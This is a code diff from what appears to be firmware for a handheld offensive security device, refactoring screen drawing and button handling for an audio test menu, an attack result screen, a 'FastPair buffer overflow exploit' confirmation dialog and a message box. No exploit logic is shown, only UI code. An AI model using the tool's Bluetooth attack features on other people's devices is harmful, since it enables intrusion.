+                    tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_WHITE);
+                    tft.setTextColor(TFT_BLACK, TFT_WHITE);
+                    tft.setCursor(40, yPos + 10);
+                    tft.print("> ");
+                } else {
+                    tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_DARKGREY);
+                    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+                    tft.setCursor(40, yPos + 10);
+                    tft.print("  ");
+                }
+                tft.print(displayName);
             }
-            tft.print(displayName);
+
+            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+            tft.setCursor(20, tftHeight - 35);
+            tft.print("SEL: Test  PREV/NEXT: Navigate  ESC: Back");
+            
+            lastSelected = selectedTest;
         }
 
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
-        tft.print("SEL: Test  PREV/NEXT: Navigate  ESC: Back");
-
-        bool inputProcessed = false;
-        while(!inputProcessed) {
-            if(check(EscPress)) { exitSubmenu = true; inputProcessed = true; }
-            else if(check(PrevPress)) {
-                selectedTest = (selectedTest > 0) ? selectedTest - 1 : AUDIO_TESTS - 1;
-                inputProcessed = true;
-            } else if(check(NextPress)) {
-                selectedTest = (selectedTest + 1) % AUDIO_TESTS;
-                inputProcessed = true;
-            } else if(check(SelPress)) {
-                executeAudioTest(selectedTest, target);
-                exitSubmenu = true;
-                inputProcessed = true;
-            }
-            if(!inputProcessed) delay(50);
+        if(check(EscPress)) { exitSubmenu = true; }
+        else if(check(PrevPress)) {
+            selectedTest = (selectedTest > 0) ? selectedTest - 1 : AUDIO_TESTS - 1;
+            delay(150);
+        } else if(check(NextPress)) {
+            selectedTest = (selectedTest < AUDIO_TESTS - 1) ? selectedTest + 1 : 0;
+            delay(150);
+        } else if(check(SelPress)) {
+            executeAudioTest(selectedTest, target);
+            exitSubmenu = true;
         }
+        delay(50);
     }
     cleanup.disable();
 }
@@ -4853,16 +4859,11 @@ void showAttackResult(bool success, const char* message) {
         tft.print(success ? "Attack successful!" : "Attack failed");
     }
 
-    tft.fillRoundRect(tftWidth/2 - 40, tftHeight - 60, 80, 35, 5, TFT_BLACK);
-    tft.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
-    tft.setCursor(tftWidth/2 - 15, tftHeight - 53);
-    tft.print("OK");
+    tft.setTextColor(TFT_WHITE, success ? TFT_GREEN : TFT_RED);
+    tft.setCursor(20, tftHeight - 35);
+    tft.print("SEL: Continue  ESC: Back");
 
-    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
-    tft.setCursor(20, tftHeight - 30);
-    tft.print("Press SEL to continue...");
-
-    while(!check(SelPress)) delay(50);
+    while(!check(SelPress) && !check(EscPress)) delay(50);
     delay(200);
 }
 
@@ -4888,17 +4889,6 @@ bool confirmAttack(const char* targetName) {
     
     tft.setCursor(20, 90);
     tft.println("FastPair buffer overflow exploit");
-
-    tft.fillRect(20, 140, tftWidth - 40, 60, bruceConfig.bgColor);
-    tft.fillRoundRect(50, 145, 80, 35, 5, TFT_GREEN);
-    tft.setTextColor(TFT_BLACK, TFT_GREEN);
-    tft.setCursor(70, 152);
-    tft.print("OK");
-
-    tft.fillRoundRect(150, 145, 80, 35, 5, TFT_RED);
-    tft.setTextColor(TFT_WHITE, TFT_RED);
-    tft.setCursor(170, 152);
-    tft.print("NO");
 
     tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
     tft.setCursor(20, tftHeight - 35);
@@ -4971,92 +4961,54 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
     if(strlen(btn2) > 0) buttonCount++;
     if(strlen(btn3) > 0) buttonCount++;
 
-    if(buttonCount == 0 && autoProgress) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("MESSAGE")) / 2, 15);
-        tft.print("MESSAGE");
-        tft.setTextSize(1);
-        tft.setTextColor(color, bruceConfig.bgColor);
+    tft.fillScreen(bruceConfig.bgColor);
+    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    tft.setTextSize(2);
+    tft.setCursor((tftWidth - tft.textWidth("MESSAGE")) / 2, 15);
+    tft.print("MESSAGE");
+    tft.setTextSize(1);
+
+    tft.setTextColor(color, bruceConfig.bgColor);
+    
+    String lineStr = line1;
+    int maxWidth = tftWidth - 40;
+    int lineHeight = 20;
+    int yPos = 70;
+    int start = 0;
+    int len = lineStr.length();
+    
+    while(start < len) {
+        int end = start;
+        int lastSpace = -1;
         
-        String lineStr = line1;
-        int maxWidth = tftWidth - 40;
-        int lineHeight = 20;
-        int yPos = 80;
-        int start = 0;
-        int len = lineStr.length();
-        
-        while(start < len) {
-            int end = start;
-            int lastSpace = -1;
-            
-            while(end < len && (end - start) * 6 < maxWidth) {
-                if(lineStr.charAt(end) == ' ') lastSpace = end;
-                end++;
-            }
-            
-            if(end == len || lastSpace == -1) {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, end));
-                start = end;
-            } else {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, lastSpace));
-                start = lastSpace + 1;
-            }
-            yPos += lineHeight;
-            if(yPos > tftHeight - 60) break;
+        while(end < len && (end - start) * 6 < maxWidth) {
+            if(lineStr.charAt(end) == ' ') lastSpace = end;
+            end++;
         }
-        delay(1500);
-        return 0;
+        
+        if(end == len || lastSpace == -1) {
+            tft.setCursor(20, yPos);
+            tft.print(lineStr.substring(start, end));
+            start = end;
+        } else {
+            tft.setCursor(20, yPos);
+            tft.print(lineStr.substring(start, lastSpace));
+            start = lastSpace + 1;
+        }
+        yPos += lineHeight;
+        if(yPos > 140) break;
     }
 
+    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    tft.setCursor(20, tftHeight - 35);
+    
     if(buttonCount == 0) {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("MESSAGE")) / 2, 15);
-        tft.print("MESSAGE");
-        tft.setTextSize(1);
-        tft.setTextColor(color, bruceConfig.bgColor);
-        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
-        
-        String lineStr = line1;
-        int maxWidth = tftWidth - 40;
-        int lineHeight = 20;
-        int yPos = 70;
-        int start = 0;
-        int len = lineStr.length();
-        
-        while(start < len) {
-            int end = start;
-            int lastSpace = -1;
-            
-            while(end < len && (end - start) * 6 < maxWidth) {
-                if(lineStr.charAt(end) == ' ') lastSpace = end;
-                end++;
-            }
-            
-            if(end == len || lastSpace == -1) {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, end));
-                start = end;
-            } else {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, lastSpace));
-                start = lastSpace + 1;
-            }
-            yPos += lineHeight;
-            if(yPos > 160) break;
+        if(autoProgress) {
+            delay(1500);
+            return 0;
         }
-
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
         tft.print("Press any key to continue...");
-
         while(true) {
             if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                 delay(200);
@@ -5065,143 +5017,19 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
             delay(50);
         }
     } else if(buttonCount == 1) {
-        const char* buttons[] = {btn1, btn2, btn3};
-        const char* actualBtn = "";
-        for(int i = 0; i < 3; i++) if(strlen(buttons[i]) > 0) { actualBtn = buttons[i]; break; }
-
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("MESSAGE")) / 2, 15);
-        tft.print("MESSAGE");
-        tft.setTextSize(1);
-
-        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
-        tft.setTextColor(color, bruceConfig.bgColor);
-        
-        String lineStr = line1;
-        int maxWidth = tftWidth - 40;
-        int lineHeight = 20;
-        int yPos = 70;
-        int start = 0;
-        int len = lineStr.length();
-        
-        while(start < len) {
-            int end = start;
-            int lastSpace = -1;
-            
-            while(end < len && (end - start) * 6 < maxWidth) {
-                if(lineStr.charAt(end) == ' ') lastSpace = end;
-                end++;
-            }
-            
-            if(end == len || lastSpace == -1) {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, end));
-                start = end;
-            } else {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, lastSpace));
-                start = lastSpace + 1;
-            }
-            yPos += lineHeight;
-            if(yPos > 120) break;
-        }
-
-        String btnText = actualBtn;
-        if(btnText.length() > 12) btnText = btnText.substring(0, 9) + "...";
-        int btnWidth = btnText.length() * 12 + 20;
-        if(btnWidth < 100) btnWidth = 100;
-        int btnX = (tftWidth - btnWidth) / 2;
-        int btnY = 150;
-
-        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
-        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
-        int textWidth = btnText.length() * 6;
-        int textX = btnX + (btnWidth - textWidth) / 2;
-        tft.setCursor(textX, btnY + 12);
-        tft.print(btnText);
-
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
         tft.print("SEL: Select  ESC: Cancel");
-
         while(true) {
             if(check(EscPress)) { delay(200); return -1; }
             if(check(SelPress)) { delay(200); return 0; }
             delay(50);
         }
     } else {
-        tft.fillScreen(bruceConfig.bgColor);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("SELECT")) / 2, 15);
-        tft.print("SELECT");
-        tft.setTextSize(1);
-
-        tft.setTextColor(color, bruceConfig.bgColor);
-        
-        String lineStr = line1;
-        int maxWidth = tftWidth - 40;
-        int lineHeight = 20;
-        int yPos = 70;
-        int start = 0;
-        int len = lineStr.length();
-        
-        while(start < len) {
-            int end = start;
-            int lastSpace = -1;
-            
-            while(end < len && (end - start) * 6 < maxWidth) {
-                if(lineStr.charAt(end) == ' ') lastSpace = end;
-                end++;
-            }
-            
-            if(end == len || lastSpace == -1) {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, end));
-                start = end;
-            } else {
-                tft.setCursor(20, yPos);
-                tft.print(lineStr.substring(start, lastSpace));
-                start = lastSpace + 1;
-            }
-            yPos += lineHeight;
-            if(yPos > 130) break;
-        }
-
-        int btnWidth = 80, btnHeight = 35, btnY = 150;
-
-        if(strlen(btn1) > 0) {
-            tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
-            tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
-            tft.setCursor(60, btnY + 12);
-            String btn1Str = btn1;
-            if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
-            tft.print(btn1Str);
-        }
-
-        if(strlen(btn2) > 0) {
-            tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
-            tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
-            tft.setCursor(160, btnY + 12);
-            String btn2Str = btn2;
-            if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
-            tft.print(btn2Str);
-        }
-
-        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-        tft.setCursor(20, tftHeight - 35);
-        if(strlen(btn3) > 0) tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
-        else tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");
-
+        tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
         while(true) {
             if(check(EscPress)) { delay(200); return -1; }
             if(check(SelPress)) { delay(200); return 0; }
             if(check(NextPress)) { delay(200); return 1; }
-            if(strlen(btn3) > 0 && check(PrevPress)) { delay(200); return 2; }
+            if(buttonCount > 2 && check(PrevPress)) { delay(200); return 2; }
             delay(50);
         }
     }
